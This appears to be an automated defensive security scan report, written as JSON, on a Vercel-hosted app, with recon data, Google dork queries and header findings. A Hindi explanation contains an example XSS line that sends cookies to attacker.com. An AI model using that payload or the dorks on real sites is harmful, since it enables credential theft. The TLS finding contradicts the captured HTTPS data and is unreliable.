@@ -1,0 +1,1864 @@
+{
+  "scan_id": 39,
+  "target_url": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+  "mode": "defend",
+  "intensity": "high",
+  "scanner": {
+    "subdomains": [
+      "admin.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "api.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "app.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "auth.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "backup.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "beta.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "blog.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "cdn.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "cms.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "dashboard.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "db.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "dev.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "docs.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "ftp.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "git.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "grafana.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "imap.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "internal.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "jenkins.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "jira.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "kibana.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "login.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "mail.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "mongo.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "mx.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "mysql.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "ns1.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "ns2.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "old.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "pop.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "portal.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "redis.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "shop.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "smtp.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "staging.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "status.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "support.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "test.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "vpn.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "www.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app"
+    ],
+    "open_ports": [
+      53,
+      80,
+      443
+    ],
+    "tech_stack": {
+      "technologies": [
+        "Vercel"
+      ],
+      "headers": {
+        "access-control-allow-origin": "*",
+        "age": "997",
+        "cache-control": "public, max-age=0, must-revalidate",
+        "content-disposition": "inline",
+        "content-encoding": "gzip",
+        "content-security-policy": "default-src 'self' vercel.com *.vercel.com *.vercel.sh vercel.live *.stripe.com twitter.com *.twitter.com *.google.com *.github.com *.codesandbox.io https://risk.clearbit.com wss://*.vercel.com localhost:* chrome-extension://*;script-src 'self' 'unsafe-eval' 'unsafe-inline' blob: www.google.com www.gstatic.com *.youtube.com *.youtube-nocookie.com *.ytimg.com *.twimg.com cdn.ampproject.org *.googleapis.com *.fides-cdn.ethyca.com *.ethyca.com cdn.ethyca.com cdn.vercel-insights.com va.vercel-scripts.com cdp.vercel.com vercel.com *.vercel.com *.vercel.sh vercel.live *.stripe.com twitter.com *.twitter.com *.google.com *.github.com *.codesandbox.io https://risk.clearbit.com wss://*.vercel.com localhost:* chrome-extension://*;child-src *.youtube.com *.youtube-nocookie.com *.stripe.com www.google.com github.com calendly.com *.vusercontent.net *.vercel.run vercel.com *.vercel.com *.vercel.sh vercel.live *.stripe.com twitter.com *.twitter.com *.google.com *.github.com *.codesandbox.io https://risk.clearbit.com wss://*.vercel.com localhost:* chrome-extension://*;style-src 'self' 'unsafe-inline' *.googleapis.com vercel.com *.vercel.com *.vercel.sh vercel.live *.stripe.com twitter.com *.twitter.com *.google.com *.github.com *.codesandbox.io https://risk.clearbit.com wss://*.vercel.com localhost:* chrome-extension://*;img-src * blob: data:;media-src 'self' videos.ctfassets.net user-images.githubusercontent.com replicate.delivery *.public.blob.vercel-storage.com *.private.blob.vercel-storage.com blob: data: vercel.com *.vercel.com *.vercel.sh vercel.live *.stripe.com twitter.com *.twitter.com *.google.com *.github.com *.codesandbox.io https://risk.clearbit.com wss://*.vercel.com localhost:* chrome-extension://*;connect-src wss://ws-us3.pusher.com data: * https://*.contentful.com cdp.vercel.com;font-src 'self' *.vercel.com *.gstatic.com vercel.live;frame-ancestors 'self' https://vercel.com https://app.contentful.com https://*.contentful.com https://*.vercel.sh https://*.vercel.com;worker-src 'self' *.vercel.com blob:",
+        "content-type": "text/html; charset=utf-8",
+        "date": "Wed, 29 Jul 2026 14:25:12 GMT",
+        "feature-policy": "fullscreen 'self'; camera 'none'",
+        "link": "<https://avatars.githubusercontent.com>; rel=preconnect; crossorigin=\"\", <https://py8fhxnkzwtsqdo9.public.blob.vercel-storage.com>; rel=preconnect; crossorigin=\"\", <https://images.ctfassets.net>; rel=preconnect; crossorigin=\"\", <https://accounts.google.com>; rel=preconnect; crossorigin=\"\", </_next/static/immutable/media/797e433ab948586e.p.1v5bejj26fx9h.woff2>; rel=preload; as=\"font\"; crossorigin=\"\"; type=\"font/woff2\", </_next/static/immutable/media/Geist_Variable-s.p.2v-cf9syxr5ni.woff2>; rel=preload; as=\"font\"; crossorigin=\"\"; type=\"font/woff2\"",
+        "referrer-policy": "origin-when-cross-origin",
+        "server": "Vercel",
+        "strict-transport-security": "max-age=31536000; includeSubDomains; preload",
+        "vary": "rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch",
+        "x-content-type-options": "nosniff",
+        "x-dns-prefetch-control": "on",
+        "x-download-options": "noopen",
+        "x-frame-options": "DENY",
+        "x-matched-path": "/login",
+        "x-nextjs-prerender": "1",
+        "x-nextjs-stale-time": "300",
+        "x-vercel-cache": "HIT",
+        "x-vercel-id": "bom1::t4rw8-1785335112800-489b516b11e6",
+        "x-xss-protection": "0",
+        "transfer-encoding": "chunked"
+      },
+      "server": "Vercel",
+      "x_powered_by": "",
+      "framework": "unknown"
+    },
+    "dns_records": {
+      "A": [
+        "64.29.17.131",
+        "216.198.79.131"
+      ],
+      "AAAA": [],
+      "MX": [],
+      "TXT": [],
+      "CNAME": [],
+      "NS": [],
+      "SOA": []
+    },
+    "dangling_cnames": [],
+    "waf_detected": "none"
+  },
+  "shadow_recon": {
+    "whois": {
+      "registrar": "",
+      "creation_date": "",
+      "expiration_date": "",
+      "name_servers": "",
+      "registrant_org": "",
+      "raw": {}
+    },
+    "dork_urls": [
+      "site:nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app ext:env OR ext:sql OR ext:log OR ext:bak",
+      "site:nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app inurl:admin OR inurl:login OR inurl:dashboard",
+      "site:nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app \"index of /\" OR \"parent directory\"",
+      "\"nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app\" filetype:pdf OR filetype:xlsx OR filetype:docx",
+      "site:nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app intitle:\"phpinfo\" OR intitle:\"phpmyadmin\"",
+      "site:nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app inurl:api OR inurl:rest OR inurl:graphql"
+    ],
+    "disallowed_paths": [],
+    "sitemap_urls": [],
+    "exposed_files": [],
+    "leaked_emails": [],
+    "js_sourcemaps": [],
+    "robots_txt": "<!DOCTYPE html><html data-dpl-id=\"dpl_E2bLC5KvHETiUdjYzeA2n8B13vw3\" class=\"geist_mono_fe992356-module__VEU71W__className geistsans_d5a4f12f-module__6kE1lG__className geist_mono_fe992356-module__VEU71W__variable geistsans_d5a4f12f-module__6kE1lG__variable dash\" lang=\"en-US\"><head><meta charSet=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\"/><link rel=\"stylesheet\" href=\"/_next/static/immutable/chunks/2ptg0w7v7pvr-.css\" data-precedence=\"next\"/><link rel=\"stylesheet\" href=\"/_next/static/immutable/chunks/0rfssig9q_ooi.css\" data-precedence=\"next\"/><link rel=\"stylesheet\" href=\"/_next/static/immutable/chunks/3-qb-ev6vlqj7.css\" data-precedence=\"next\"/><link rel=\"stylesheet\" href=\"/_next/static/immutable/chunks/36v9o_tozcokl.css\" data-precedence=\"next\"/><link rel=\"stylesheet\" href=\"/_next/static/immutable/chunks/1k2xfmi7zh1t3.css\" data-precedence=\"next\"/><link rel=\"stylesheet\" href=\"/_next/static/immutable/chunks/093kcf7isw44k.css\" data-precedence=\"next\"/><link rel=\"preload\" as=\"script\" fetchPriority=\"low\" href=\"/_next/static/immutable/chunks/2qnzbkbl6p1l_.js\"/><script src=\"/_next/static/immutable/chunks/1ktzd037dr1n7.js\" async=\"\"></script><script src=\"/_next/static/immutable/chunks/2uicm_ii5pr4u.js\" async=\"\"></script><script src=\"/_next/static/immutable/chunks/0jt5qold34o32.js\" async=\"\"></script><script src=\"/_next/static/immutable/chunks/39ikkl129xzo9.js\" async=\"\"></script><script src=\"/_next/static/immutable/chunks/turbopack-3bcrl6lkn9xnz.js\" async=\"\"></script><script src=\"/_next/static/immutable/chunks/00bodhzjwyq5x.js\" async=\"\" crossorigin=\"\"></script><script src=\"/_next/static/immutable/chunks/0gu-s_plbg260.js\" async=\"\" crossorigin=\"\"></script><script src=\"/_next/static/immutable/chunks/3n2gxk3l9t-f7.js\" async=\"\" crossorigin=\"\"></script><script src=\"/_next/static/immutable/chunks/2fu4uhk-t8uqv.js\" async=\"\" crossorigin=\"\"></script><script src=\"/_next/static/immutable/chunks/2ryzkdua8sfzs.js\" async=\"\" crossorigin=\"\"></script>",
+    "sitemap_xml": "<!DOCTYPE html><html data-dpl-id=\"dpl_E2bLC5KvHETiUdjYzeA2n8B13vw3\" class=\"geist_mono_fe992356-module__VEU71W__className geistsans_d5a4f12f-module__6kE1lG__className geist_mono_fe992356-module__VEU71W__variable geistsans_d5a4f12f-module__6kE1lG__variable dash\" lang=\"en-US\"><head><meta charSet=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\"/><link rel=\"stylesheet\" href=\"/_next/static/immutable/chunks/2ptg0w7v7pvr-.css\" data-precedence=\"next\"/><link rel=\"stylesheet\" href=\"/_next/static/immutable/chunks/0rfssig9q_ooi.css\" data-precedence=\"next\"/><link rel=\"stylesheet\" href=\"/_next/static/immutable/chunks/3-qb-ev6vlqj7.css\" data-precedence=\"next\"/><link rel=\"stylesheet\" href=\"/_next/static/immutable/chunks/36v9o_tozcokl.css\" data-precedence=\"next\"/><link rel=\"stylesheet\" href=\"/_next/static/immutable/chunks/1k2xfmi7zh1t3.css\" data-precedence=\"next\"/><link rel=\"stylesheet\" href=\"/_next/static/immutable/chunks/093kcf7isw44k.css\" data-precedence=\"next\"/><link rel=\"preload\" as=\"script\" fetchPriority=\"low\" href=\"/_next/static/immutable/chunks/2qnzbkbl6p1l_.js\"/><script src=\"/_next/static/immutable/chunks/1ktzd037dr1n7.js\" async=\"\"></script><script src=\"/_next/static/immutable/chunks/2uicm_ii5pr4u.js\" async=\"\"></script><script src=\"/_next/static/immutable/chunks/0jt5qold34o32.js\" async=\"\"></script><script src=\"/_next/static/immutable/chunks/39ikkl129xzo9.js\" async=\"\"></script><script src=\"/_next/static/immutable/chunks/turbopack-3bcrl6lkn9xnz.js\" async=\"\"></script><script src=\"/_next/static/immutable/chunks/00bodhzjwyq5x.js\" async=\"\" crossorigin=\"\"></script><script src=\"/_next/static/immutable/chunks/0gu-s_plbg260.js\" async=\"\" crossorigin=\"\"></script><script src=\"/_next/static/immutable/chunks/3n2gxk3l9t-f7.js\" async=\"\" crossorigin=\"\"></script><script src=\"/_next/static/immutable/chunks/2fu4uhk-t8uqv.js\" async=\"\" crossorigin=\"\"></script><script src=\"/_next/static/immutable/chunks/2ryzkdua8sfzs.js\" async=\"\" crossorigin=\"\"></script>",
+    "internal_ips": [],
+    "html_comments": [
+      "$?",
+      "/$",
+      "$",
+      "/$",
+      "$",
+      "$",
+      "/$",
+      "/$",
+      "$?",
+      "/$",
+      "$?",
+      "/$",
+      "$?",
+      "/$",
+      "$?",
+      "/$",
+      "$",
+      "/$",
+      "$",
+      "/$",
+      "&",
+      "$?",
+      "/$",
+      "/&",
+      "$",
+      "$",
+      "/$",
+      "/$",
+      "$",
+      "$?",
+      "/$",
+      "/$",
+      "$",
+      "$!",
+      "/$",
+      "/$",
+      "$",
+      "/$",
+      "$",
+      "$?",
+      "/$",
+      "/$",
+      "&",
+      "&",
+      "$?",
+      "/$",
+      "&",
+      "$?",
+      "/$",
+      "/&",
+      "/&",
+      "/&",
+      "$?",
+      "/$"
+    ]
+  },
+  "findings": [
+    {
+      "id": 298,
+      "scan_id": 39,
+      "title": "CSP allows unsafe-inline scripts",
+      "category": "Security Headers",
+      "severity": "HIGH",
+      "confidence": "MEDIUM",
+      "target": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "evidence": "script-src includes 'unsafe-inline'",
+      "impact": "Bypasses CSP protection against XSS",
+      "recommendation": "Remove 'unsafe-inline' from script-src; use nonces or hashes",
+      "verification": "Rerun the relevant PhantomScan analysis after remediation and confirm the evidence is absent.",
+      "agent": "Analyzer Agent",
+      "timestamp": "2026-07-29T14:25:43.571938Z",
+      "description": "script-src includes 'unsafe-inline'",
+      "how_exploited": "Bypasses CSP protection against XSS",
+      "fix": "Remove 'unsafe-inline' from script-src; use nonces or hashes",
+      "cve_id": null,
+      "cvss_score": null,
+      "parameter": null,
+      "module": null,
+      "recommended_fix": "Remove 'unsafe-inline' from script-src; use nonces or hashes",
+      "remediation_status": "OPEN",
+      "verification_status": "NOT_VERIFIED",
+      "risk_status": "ACTIVE"
+    },
+    {
+      "id": 299,
+      "scan_id": 39,
+      "title": "Missing Permissions-Policy",
+      "category": "Security Headers",
+      "severity": "LOW",
+      "confidence": "MEDIUM",
+      "target": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "evidence": "No Permissions-Policy header",
+      "impact": "Browser features (camera, mic, etc.) unrestricted",
+      "recommendation": "Add: Permissions-Policy: geolocation=(), microphone=(), camera=()",
+      "verification": "Rerun the relevant PhantomScan analysis after remediation and confirm the evidence is absent.",
+      "agent": "Analyzer Agent",
+      "timestamp": "2026-07-29T14:25:43.583962Z",
+      "description": "No Permissions-Policy header",
+      "how_exploited": "Browser features (camera, mic, etc.) unrestricted",
+      "fix": "Add: Permissions-Policy: geolocation=(), microphone=(), camera=()",
+      "cve_id": null,
+      "cvss_score": null,
+      "parameter": null,
+      "module": null,
+      "recommended_fix": "Add: Permissions-Policy: geolocation=(), microphone=(), camera=()",
+      "remediation_status": "OPEN",
+      "verification_status": "NOT_VERIFIED",
+      "risk_status": "ACTIVE"
+    },
+    {
+      "id": 300,
+      "scan_id": 39,
+      "title": "Could not establish TLS connection",
+      "category": "TLS",
+      "severity": "MEDIUM",
+      "confidence": "MEDIUM",
+      "target": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "evidence": "Failed to connect to nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app:443",
+      "impact": "TLS may not be available",
+      "recommendation": "Ensure HTTPS is properly configured",
+      "verification": "Rerun the relevant PhantomScan analysis after remediation and confirm the evidence is absent.",
+      "agent": "Analyzer Agent",
+      "timestamp": "2026-07-29T14:25:43.622533Z",
+      "description": "Failed to connect to nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app:443",
+      "how_exploited": "TLS may not be available",
+      "fix": "Ensure HTTPS is properly configured",
+      "cve_id": null,
+      "cvss_score": null,
+      "parameter": null,
+      "module": null,
+      "recommended_fix": "Ensure HTTPS is properly configured",
+      "remediation_status": "OPEN",
+      "verification_status": "NOT_VERIFIED",
+      "risk_status": "ACTIVE"
+    },
+    {
+      "id": 301,
+      "scan_id": 39,
+      "title": "Server version disclosure",
+      "category": "Information Disclosure",
+      "severity": "LOW",
+      "confidence": "MEDIUM",
+      "target": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "evidence": "Header 'server: Vercel'",
+      "impact": "Attackers fingerprint stack for targeted exploits",
+      "recommendation": "Remove or obfuscate the 'server' header in server config",
+      "verification": "Rerun the relevant PhantomScan analysis after remediation and confirm the evidence is absent.",
+      "agent": "Analyzer Agent",
+      "timestamp": "2026-07-29T14:25:43.634061Z",
+      "description": "Header 'server: Vercel'",
+      "how_exploited": "Attackers fingerprint stack for targeted exploits",
+      "fix": "Remove or obfuscate the 'server' header in server config",
+      "cve_id": null,
+      "cvss_score": null,
+      "parameter": null,
+      "module": null,
+      "recommended_fix": "Remove or obfuscate the 'server' header in server config",
+      "remediation_status": "OPEN",
+      "verification_status": "NOT_VERIFIED",
+      "risk_status": "ACTIVE"
+    },
+    {
+      "id": 302,
+      "scan_id": 39,
+      "title": "API response permits reads from any origin",
+      "category": "API Security",
+      "severity": "LOW",
+      "confidence": "MEDIUM",
+      "target": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "evidence": "Captured response sets Access-Control-Allow-Origin: *.",
+      "impact": "The policy may expose browser-readable API data to untrusted sites; conforming browsers reject the wildcard/credentials combination but it signals unsafe policy intent.",
+      "recommendation": "Allow only required trusted origins and enable credentials only for endpoints that need them.",
+      "verification": "Send approved requests from trusted and untrusted origins and confirm only trusted origins receive an allow-origin response.",
+      "agent": "API Security Agent",
+      "timestamp": "2026-07-29T14:25:15.598969Z",
+      "description": "Captured response sets Access-Control-Allow-Origin: *.",
+      "how_exploited": "The policy may expose browser-readable API data to untrusted sites; conforming browsers reject the wildcard/credentials combination but it signals unsafe policy intent.",
+      "fix": "Allow only required trusted origins and enable credentials only for endpoints that need them.",
+      "cve_id": null,
+      "cvss_score": null,
+      "parameter": null,
+      "module": null,
+      "recommended_fix": "Allow only required trusted origins and enable credentials only for endpoints that need them.",
+      "remediation_status": "OPEN",
+      "verification_status": "NOT_VERIFIED",
+      "risk_status": "ACTIVE"
+    },
+    {
+      "id": 303,
+      "scan_id": 39,
+      "title": "Content Security Policy permits unsafe script execution",
+      "category": "Infrastructure Security",
+      "severity": "MEDIUM",
+      "confidence": "HIGH",
+      "target": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "evidence": "The captured CSP script policy includes unsafe-inline or unsafe-eval; nonce and hash values are omitted from evidence.",
+      "impact": "The policy provides reduced protection if attacker-controlled script or markup reaches the page.",
+      "recommendation": "Remove unsafe-eval and migrate inline scripts to nonces or hashes with narrowly scoped sources.",
+      "verification": "Capture the policy after deployment and confirm scripts work without unsafe-eval or broad unsafe-inline allowances.",
+      "agent": "Infrastructure Agent",
+      "timestamp": "2026-07-29T14:25:15.632601Z",
+      "description": "The captured CSP script policy includes unsafe-inline or unsafe-eval; nonce and hash values are omitted from evidence.",
+      "how_exploited": "The policy provides reduced protection if attacker-controlled script or markup reaches the page.",
+      "fix": "Remove unsafe-eval and migrate inline scripts to nonces or hashes with narrowly scoped sources.",
+      "cve_id": null,
+      "cvss_score": null,
+      "parameter": null,
+      "module": null,
+      "recommended_fix": "Remove unsafe-eval and migrate inline scripts to nonces or hashes with narrowly scoped sources.",
+      "remediation_status": "OPEN",
+      "verification_status": "NOT_VERIFIED",
+      "risk_status": "ACTIVE"
+    },
+    {
+      "id": 304,
+      "scan_id": 39,
+      "title": "Non-production or administrative hostnames discovered",
+      "category": "Threat Intelligence",
+      "severity": "LOW",
+      "confidence": "POTENTIAL",
+      "target": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "evidence": "Supplied reconnaissance includes sensitive-looking hostname(s): admin.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, beta.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, dev.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, internal.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, old.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, staging.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, test.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app.",
+      "impact": "Forgotten or less-hardened environments can expand the externally reachable attack surface.",
+      "recommendation": "Inventory each hostname, retire unused systems, and apply production-equivalent access controls and patching.",
+      "verification": "Confirm ownership, purpose, and access policy for every listed hostname.",
+      "agent": "Threat Intelligence Agent",
+      "timestamp": "2026-07-29T14:25:15.614020Z",
+      "description": "Supplied reconnaissance includes sensitive-looking hostname(s): admin.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, beta.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, dev.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, internal.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, old.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, staging.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, test.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app.",
+      "how_exploited": "Forgotten or less-hardened environments can expand the externally reachable attack surface.",
+      "fix": "Inventory each hostname, retire unused systems, and apply production-equivalent access controls and patching.",
+      "cve_id": null,
+      "cvss_score": null,
+      "parameter": null,
+      "module": null,
+      "recommended_fix": "Inventory each hostname, retire unused systems, and apply production-equivalent access controls and patching.",
+      "remediation_status": "OPEN",
+      "verification_status": "NOT_VERIFIED",
+      "risk_status": "ACTIVE"
+    }
+  ],
+  "hindi_findings": [
+    {
+      "agent": "Analyzer Agent",
+      "title": "CSP allows unsafe-inline scripts",
+      "category": "Security Headers",
+      "severity": "high",
+      "evidence": "script-src includes 'unsafe-inline'",
+      "impact": "Bypasses CSP protection against XSS",
+      "fix": "Remove 'unsafe-inline' from script-src; use nonces or hashes",
+      "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "cve_id": null,
+      "cvss_score": null,
+      "hindi_report": "**1. क्या है यह?**  \nयह Content Security Policy (CSP) है, जो वेब पेज को बताती है कि ब्राउज़र कौन‑से स्क्रिप्ट (script) और resources चलाने की अनुमति दे। यहाँ `script-src` में `'unsafe-inline'` लिखा है, जिसका मतलब है कि पेज में लिखे हुए `<script>...</script>` जैसे इन‑लाइन स्क्रिप्ट को चलाने की अनुमति दी गई है। यह एक बड़ी सुरक्षा कमजोरी है।\n\n**2. हमलावर कैसे exploit करता है?**  \nहमलावर XSS (Cross‑Site Scripting) के जरिए पेज में खराब‑मिज़ाज (malicious) इन‑लाइन स्क्रिप्ट डाल देता है, जैसे:  \n\n```html\n<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>\n```  \n\nचूँकि CSP में `'unsafe-inline'` है, ब्राउज़र इस इन‑लाइन स्क्रिप्ट को चलाने की इजाज़त देता है। परिणामस्वरूप हमलावर:\n\n* यूज़र के कूकीज़, टोकन या अन्य संवेदनशील डेटा को चोरी कर सकता है,  \n* पेज को अपने कब्जे में ले कर अनधिकृत कार्य कर सकता है,  \n* फिशिंग या रansomware जैसी进一步 हमले कर सकता है।\n\n**3. इस प्लेटफ़ॉर्म (https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/) के लिए exact fix क्या है?**  \n\n- **CSP हेडर/मेटा टैग को अपडेट करें** – `'unsafe-inline'` को हटाएँ और वैध स्क्रिप्ट‑स्रोत (nonces या hashes) जोड़ें।  \n  उदाहरण (Next.js/vercel में):  \n\n  ```js\n  // next.config.js\n  module.exports = {\n    async headers() {\n      return [\n        {\n          source: '/(.*)',          // सभी पेजों के लिए\n          headers: [\n            {\n              key: 'Content-Security-Policy',\n              value:\n                \"script-src 'self' 'nonce-{RANDOM}' 'sha256-{HASH}' https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app; \" +\n                \"object-src 'none'; base-uri 'self';\"\n            },\n          ],\n        },\n      ];\n    },\n  };\n  ```\n\n  - यहाँ `{RANDOM}` एक यादृच्छिक nonce मान है, जो प्रत्येक रिक्वेस्ट पर बदलना चाहिए।  \n  - `{HASH}` उस इन‑लाइन स्क्रिप्ट का SHA‑256 हैश है, जिसे आप तभी उपयोग कर सकते हैं जब स्क्रिप्ट बिल्कुल स्थिर हो।  \n\n- **इन‑लाइन स्क्रिप्ट को हटाएँ या बाहरी फ़ाइल में ले जाएँ** – सबसे सुरक्षित तरीका यह है कि सभी JS को अलग‑अलग फ़ाइल (`.js`) में रखें और `script-src 'self'` या विशिष्ट डोमेन पर सीमित रखें।  \n\n- **इवेंट‑हैंडलर (onclick, onload आदि) को हटाएँ** – इन्हें `addEventListener` के साथ जोड़ें, ताकि वे CSP की शर्तों के बाहर न जाएँ।  \n\n- **तीसरे‑पक्ष की स्क्रिप्ट को मंज़ूरी दें** – यदि किसी बाहरी लाइब्रेरी (जैसे CDN) की आवश्यकता है, तो उसे `'self'` या उस CDN के डोमेन पर सीमित करें, और SRI (Subresource Integrity) का उपयोग करें।  \n\n- **CSP को टेस्ट करें** – `report-uri` या `report-to` हेडर जोड़ें ताकि कोई भी उल्लंघन ब्राउज़र में रिपोर्ट हो, जिससे समस्या जल्दी पहचानी जा सके।  \n\nइस प्रकार आप `'unsafe-inline'` को हटाकर, केवल अनुमति‑प्राप्त (nonce/ hash) इन‑लाइन स्क्रिप्ट या बाहरी स्क्रिप्टों को ही चलाने की अनुमति देंगे, जिससे XSS‑आधारित हमला संभव नहीं रहेगा।"
+    },
+    {
+      "agent": "Analyzer Agent",
+      "title": "Missing Permissions-Policy",
+      "category": "Security Headers",
+      "severity": "low",
+      "evidence": "No Permissions-Policy header",
+      "impact": "Browser features (camera, mic, etc.) unrestricted",
+      "fix": "Add: Permissions-Policy: geolocation=(), microphone=(), camera=()",
+      "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "cve_id": null,
+      "cvss_score": null
+    },
+    {
+      "agent": "Analyzer Agent",
+      "title": "Could not establish TLS connection",
+      "category": "TLS",
+      "severity": "medium",
+      "evidence": "Failed to connect to nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app:443",
+      "impact": "TLS may not be available",
+      "fix": "Ensure HTTPS is properly configured",
+      "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "cve_id": null,
+      "cvss_score": null
+    },
+    {
+      "agent": "Analyzer Agent",
+      "title": "Server version disclosure",
+      "category": "Information Disclosure",
+      "severity": "low",
+      "evidence": "Header 'server: Vercel'",
